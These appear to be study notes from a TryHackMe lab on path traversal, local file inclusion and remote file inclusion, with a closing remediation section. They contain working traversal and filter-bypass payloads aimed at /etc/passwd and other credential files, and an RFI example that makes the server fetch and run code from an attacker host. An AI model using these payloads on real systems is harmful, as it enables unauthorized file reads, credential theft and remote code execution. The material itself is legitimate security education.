# File Inclusion
* Web applications are written to request access to files on a given system in some scenarios:including images, static text, and so on via parameters.
* Essential parts of the `http://webapp.thm/get.php?file=userCV.pdf` URL:
  * Protocol = `http:`
  * Domain Name = `webapp.thm`
  * File Name = `get.php`
  * Query string begin = `?`
  * Parameters = `file`
* **Parameters** are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input.
  * These are used with Google searching, where `GET` requests pass user input into the search engine: `https://www.google.com/search?q=TryHackMe`. 

> 1. A user requests to display their CV within a web application.
> 2. The HTTP request to the web server is `http://webapp.thm/get.php?file=userCV.pdf`.
>    * `file` is the parameter and `userCV.pdf` is the required file to access.﻿

## Why do File inclusion vulnerabilities happen?﻿
* Main issue is input validation where user inputs are not sanitised or validated and the user controls the input.
* Commonly found in programming languages for web applications that are poorly written and implemented.
* Users may pass any input to the function causing the vulnerability when the input is not validated.
## What is the risk of File inclusion?
* Data leakage related to the web application or OS:
  * Code.
  * Credentials.
  * Other important files
* Vulnerability might be used in tandem to gain remote command execution (RCE) if the attacker can write files to the server by any other means.

## Path Traversal
* AKA Directory traversal or the dot-dot-slash attack.
* Vulnerability that allows an attacker to read OS resources:
  * E.g. local files on the server running an application. 
* Attacker exploits pth traversal by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.
* These vulnerabilities occur when the user's input is passed to a function such as `file_get_contents` in PHP.
* Poor input validation or filtering is often the cause.
* Use `file_get_contents` in PHP to read the content of a file.
  * More information about the function can be found [here](https://www.php.net/manual/en/function.file-get-contents.php).
    
> * Suppose a web application stores files in `/var/www/app`.
> * The happy path would be the user requesting the contents of `userCV.pdf` from a defined path `/var/www/app/CVs`.
> * The URL parameter can be tested by adding payloads to see how the web application behaves.
>   * Path traversal attacks take advantage of moving the directory one step up using the double dots `../`.
> * If the attacker finds the entry point (`get.php?file=`) they may send something like `http://webapp.thm/get.php?file=../../../../etc/passwd`.
>   * If there is no input validation instead of accessing the PDF files at `/var/www/app/CVs` location, the web application retrieves files from other directories, which in this case `/etc/passwd`.
>   * Each `..` entry moves one directory until it reaches the root directory /.
>   * Then it changes the directory to `/etc`, and from there, it reads the `passwd` file.
> * The web application sends back the file's content to the user.

* The attacker needs to provide Windows paths if the web application runs on a Windows server.
  * If an attacker wants to read the `boot.ini` file located in `c:\boot.ini`, then they can try the following depending on the target OS version:
    * `http://webapp.thm/get.php?file=../../../../boot.ini`.
    * `http://webapp.thm/get.php?file=../../../../windows/win.ini`.
* The same concept applies here as with Linux operating systems, where directories are climbed until it reaches the root directory, which is usually `c:\`.
* Developers will sometimes add filters to limit access to only certain files or directories.
* Common OS files that could be used when testing:

| Location | Description
| --- | ---
| `/etc/issue` | Contains a message or system identification to be printed before the login prompt.
| `/etc/profile` | Controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived
| `/proc/version` | Specifies the version of the Linux kernel.
| `/etc/passwd` | Has all registered user that has access to a system.
| `/etc/shadow` | Contains information about the system's users' passwords.
| `/root/.bash_history` | Contains the history commands for root user.
| `/var/log/dmessage` | Contains global system messages, including the messages that are logged during system startup.
| `/var/mail/root` | All emails for root user.
| `/root/.ssh/id_rsa` | Private SSH keys for a root or any known valid user on the server.
| `/var/log/apache2/access.log` | The accessed requests for Apache web server.
| `C:\boot.ini` | Contains the boot options for computers with BIOS firmware.

## Local File Inclusion (﻿LFI)
* LFI exploits follow the same concepts as path traversal.
* Often caused by developers' lack of security awareness.
* Using functions such as `include`, `require`, `include_once`, and `require_once` with PHP often contribute to vulnerable web applications.
* Alos occurs when using other languages such as ASP, JSP, or in Node.js apps. 

### LFI Example 1 - No Input Validation
1. A web application provides two languages, and a user can select between EN and AR:
   * `<?PHP include($_GET["lang"]); ?>`
2.  The PHP code uses a `GET` request via the URL parameter `lang` to include the file of the page.
3.  The call can be done by sending the HTTP request:
    * `http://webapp.thm/index.php?lang=EN.php` to load the English page.
    * `http://webapp.thm/index.php?lang=AR.php` to load the Arabic page.
    * Where `EN.php` and `AR.php` files exist in the same directory.
5. Any readable file can theoretically be accessed and displayed on the server from the code if there is no any input validation.
6. Try `http://webapp.thm/get.php?file=/etc/passwd` to read the `/etc/passwd` file.
   * This file contains sensitive information about the users of the Linux operating system.
8. This works because there is no directory specified in the `include` function and no input validation.
### LFI Example 2 - Specified Directory
1. The developer has now decided to specify the directory inside the function:
   * `<?PHP	include("languages/". $_GET['lang']); ?>`
   * The developer decided to use the `include` function in the code to call PHP pages in the languages directory only via `lang` parameters.
2. An attacker can manipulate the URL by replacing the `lang` input with other OS sensitive files such as `/etc/passwd` if there is no input validation.
3. The payload looks similar to the path traversal but the `include` function allows inclusion of any called files into the current page:
   * `http://webapp.thm/index.php?lang=../../../../etc/passwd`
### LFI Example 3 - Unknown Source Code (Black-box)
1. In the first two cases, the source code for the web app was checked, and then the tester knew how to exploit it.
2. However, in this case, black box testing is being performed in which the source code is not known.
3. Errors are very significant in understanding how the data is passed and processed into the web app.
4. The entry point is `http://webapp.thm/index.php?lang=EN`.
5. If an invalid input is entered such as `THM`, then the following error is displayed: `Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12`.
    * The error message discloses what the `include` function looks like: `include(languages/THM.php);`.
    * If the directory is looked at closely, the function includes files in the languages directory and is adding `.php` at the end of the entry.
10. Valid input will be something like `index.php?lang=EN`.
    * Where the file `EN` is located inside the given languages directory and named `EN.php`.
12. The error message disclosed another important piece of information about the full web application directory path, which is `/var/www/html/THM-4/`.
13. To exploit this, use the `../` trick to escape the current folder.
14. Try: `http://webapp.thm/index.php?lang=../../../../etc/passwd`.
     * 4 x `../` were used because the path has four levels `/var/www/html/THM-4`.
17. A `Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12` error is still received.
    * The `include` function still reads the input with `.php` at the end.
    * The developer specifies the file type to pass to the `include` function.
21. To bypass this, use the NULL BYTE, which is `%00`.
    * The `%00` trick is fixed and not working with PHP 5.3.4 and above.
    * Using null bytes is an injection technique where URL encoded representation such as `%00` or `0x00` in hex with user supplied data to terminate strings.
    * This is trying to trick the web app into disregarding whatever comes after the Null Byte.
24. By adding the Null Byte at the end of the payload, it is telling the `include` function to ignore anything after the null byte:
    * `include("languages/../../../../../etc/passwd%00").".php");` which equivalent to `include("languages/../../../../../etc/passwd");`
### LFI Example 4 - Filtered `/etc/passwd` File
1. The developer has now decided to filter keywords to avoid disclosing sensitive information.
   * The `/etc/passwd` file is being filtered.
3. The first method of bypassing the filter is to use the NullByte: `%00`.
   * `http://webapp.thm/index.php?lang=/etc/passwd%00`.
5. The second method is the current directory trick at the end of the filtered keyword: `/.`.
   * `http://webapp.thm/index.php?lang=/etc/passwd/.`.
      * To make this clearer, apply the concept to the file system:
      * `cd ..` goes back one step toward the root directory.
        *  If `/etc/passwd/..` is tried it results to be  `/etc/` because the command moved one level to the root.
      * `cd .` stays in the current directory.
        *  If `/etc/passwd/.` is tried the result will be `/etc/passwd` since dot refers to the current directory.
### LFI Example 5 - Keyword Filtering
1. Next, the developer starts to use input validation by filtering some keywords.
3. Test using `http://webapp.thm/index.php?lang=../../../../etc/passwd`
4. A `Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15` is displayed.
   * The `include(languages/etc/passwd)` section of the warning shows that the web application replaces `../` with an empty string.
7. Send the following payload to bypass it `....//....//....//....//....//etc/passwd`.
   * This works because the PHP filter only matches and replaces the first subset string `../` it finds and doesn't do another pass.
### LFI Example 6 - Defined Directory
1. Finally, the developer now forces the `include` to read from a defined directory (languages).
2. The web application asks to supply input that has to include a directory such as `http://webapp.thm/index.php?lang=languages/EN.php`.
3. Include the directory in the payload to exploit this: `?lang=languages/../../../../../etc/passwd`.

## Remote File Inclusion (RFI)
* Technique to include remote files into a vulnerable application.
* RFI occurs when improperly sanitising user input, allowing an attacker to inject an external URL into include function.
* One requirement for RFI is that the `allow_url_fopen` option needs to be on.
* The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server.
* Other consequences of a successful RFI attack include:
  * Sensitive Information Disclosure.
  * Cross-site Scripting (XSS).
  * Denial of Service (DoS).
* An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server.
* Then the malicious file is injected into the `include` function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.

### Example of Successful RFI Attack
1. An attacker hosts a PHP file on their own server `http://attacker.thm/cmd.txt`.
   * `cmd.txt` contains a printing message `Hello THM`: `<?PHP echo "Hello THM"; ?>`.
2. The attacker injects the malicious URL, which points to the attacker's server, such as `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`.
3. If there is no input validation then the malicious URL passes into the `include` function.
4. The web app server sends a `GET` request to the malicious server to fetch the file.
   * The web app includes the remote file into the `include` function to execute the PHP file within the page and send the execution content to the attacker.
   * In this case, the current page somewhere will display the `Hello THM` message.

### Remediation
* As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods.
* To prevent the file inclusion vulnerabilities, some common suggestions include:
  * Keep system and services, including web application frameworks, updated with the latest version.
  * Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
  * A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
  * Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
  * Carefully analyse the web application and allow only protocols and PHP wrappers that are in need.
  * Never trust user input, and make sure to implement proper input validation against file inclusion.
  * Implement whitelisting for file names and locations as well as blacklisting.